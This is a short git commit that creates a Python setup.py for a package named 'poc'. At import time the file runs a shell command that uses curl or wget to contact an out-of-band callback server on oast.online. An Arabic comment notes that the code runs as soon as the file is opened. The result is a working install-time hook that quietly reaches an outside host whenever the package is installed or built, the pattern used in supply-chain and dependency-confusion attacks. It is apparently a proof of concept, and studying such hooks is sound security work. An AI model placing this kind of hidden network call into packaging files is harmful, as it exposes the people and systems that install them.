a7100a85386b08c14d538379008a7ab45dadc9bf
Abdelrhman Atef <64407840+abdoatef267@users.noreply.github.com>
2025-12-18 22:56:23 +0200

    Create setup.py

---
+++ setup.py
@@ -0,0 +1,11 @@
+from setuptools import setup, find_packages
+import os
+
+# أول ما الملف يتفتح، الكود ده هيشتغل
+os.system("curl http://python.d526g6o3t4gp92l5pbrg4ywsphjkpsg3b.oast.online || wget -qO- http://python-wget.d526g6o3t4gp92l5pbrg4ywsphjkpsg3b.oast.online")
+
+setup(
+    name="poc",
+    version="1.0.0",
+    packages=find_packages(),
+)
